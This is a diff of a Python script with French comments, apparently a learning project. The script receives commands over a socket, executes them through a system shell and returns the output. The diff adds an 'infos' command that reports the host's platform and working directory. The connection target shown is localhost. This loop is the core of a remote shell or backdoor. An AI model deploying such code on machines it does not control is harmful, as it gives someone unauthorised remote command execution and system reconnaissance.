@@ -1,6 +1,8 @@
 import socket
 import time
 import subprocess
+import platform
+import os
 
 
 HOST_IP = "127.0.0.1"
@@ -26,12 +28,16 @@ while True:
         break
     commande = commande_data.decode()   # String
     print(f"Commande: {commande}") # affichage de la commande qu'on a tape
-    resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True) # execution de la commande
     
-    reponse = resultat.stdout + resultat.stderr
-    
-    if not reponse or len(reponse) == 0:    # pour gerer cd qui ne renvoie aucune reponse
-        reponse = " "
+    if commande == "infos":
+        reponse = platform.platform() + " " + os.getcwd()
+    else :
+        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True) # execution de la commande
+        
+        reponse = resultat.stdout + resultat.stderr
+        
+        if not reponse or len(reponse) == 0:    # pour gerer cd qui ne renvoie aucune reponse
+            reponse = " "
     
     print("longueur de la reponse: ", len(reponse))
     # on va envoyer la reponse sur 13 octets -> longueur de la reponse = 13 octets
